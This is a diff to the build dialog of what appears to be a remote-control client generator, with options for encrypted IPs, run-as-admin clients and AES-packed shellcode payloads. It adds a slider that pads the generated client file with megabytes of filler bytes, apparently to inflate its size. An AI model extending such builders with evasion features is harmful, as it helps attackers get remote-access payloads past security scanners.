@@ -103,6 +103,7 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
     DDV_MaxChars(pDX, m_sGroupName, 23);
     DDX_Control(pDX, IDC_COMBO_PAYLOAD, m_ComboPayload);
     DDX_Control(pDX, IDC_STATIC_PAYLOAD, m_StaticPayload);
+    DDX_Control(pDX, IDC_SLIDER_CLIENT_SIZE, m_SliderClientSize);
 }
 
 
@@ -114,6 +115,7 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
     ON_COMMAND(ID_CLIENT_RUNAS_ADMIN, &CBuildDlg::OnClientRunasAdmin)
     ON_CBN_SELCHANGE(IDC_COMBO_COMPRESS, &CBuildDlg::OnCbnSelchangeComboCompress)
+	ON_NOTIFY_EX(TTN_NEEDTEXT, 0, &CBuildDlg::OnToolTipNotify)
 END_MESSAGE_MAP()
 
 
@@ -403,6 +405,11 @@ void CBuildDlg::OnBnClickedOk()
                 if (ret)MessageBox(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()),
                                        "提示", MB_ICONINFORMATION);
             }
+            int size = m_SliderClientSize.GetPos() * 2.56 * 1024 * 1024;
+            if (size > 0) {
+				std::vector<char> padding(size, time(0)%256);
+                WriteBinaryToFile(strSeverFile.GetString(), padding.data(), size, -1);
+            }
             MessageBox("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         }
         SAFE_DELETE_ARRAY(szBuffer);
@@ -586,4 +593,20 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
 {
     m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
 	m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
+}
+
+BOOL CBuildDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
+{
+    TOOLTIPTEXTA* pTTT = (TOOLTIPTEXTA*)pNMHDR;
+    UINT nID = pNMHDR->idFrom;
+	if (pTTT->uFlags & TTF_IDISHWND) {
+        // idFrom is actually the HWND of the tool
+        nID = ::GetDlgCtrlID((HWND)nID);
+    }
+    if (nID == IDC_SLIDER_CLIENT_SIZE) {
+		int size = m_SliderClientSize.GetPos() * 2.56;
+        sprintf_s(pTTT->szText, "%dM", size);
+        return TRUE;
+	}
+    return FALSE;
 }
